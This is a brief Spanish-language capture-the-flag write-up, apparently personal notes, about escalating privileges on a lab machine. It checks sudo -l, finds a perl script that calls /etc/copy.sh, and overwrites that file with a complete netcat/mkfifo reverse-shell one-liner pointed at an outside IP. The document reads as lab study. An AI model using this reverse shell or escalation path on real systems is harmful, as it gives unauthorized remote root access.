
para escalar privilegios debe volverse costumbre varios pasos 
	1- permisos SUID
	2- ver si el usuario tiene algun permiso de ejecucion como administrador con sudo -l
![[Pasted image 20230911180742.png]]
aqui podemos observar que el usuario itguy tiene permisos en perl y en el archivo backup.pl 
hacemos un cat en backup.pl
![[Pasted image 20230911193659.png]]
vemos que ejecuta un shell sobre la ruta etc/copy.sh vamos a modificar el copy.sh![[Pasted image 20230911194041.png]]
hacemos un echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.76.125 445 >/tmp/f" > /etc/copy.sh esto lo hacemos para "imprimir" el echo dentro del archivo copy.
luego lo que tenemos que hacer es ejecutarlo 
![[Pasted image 20230911194239.png ]]
listo
![[Pasted image 20230911194334.png ]]
ya esta pwneada la maquina Happy hacking!
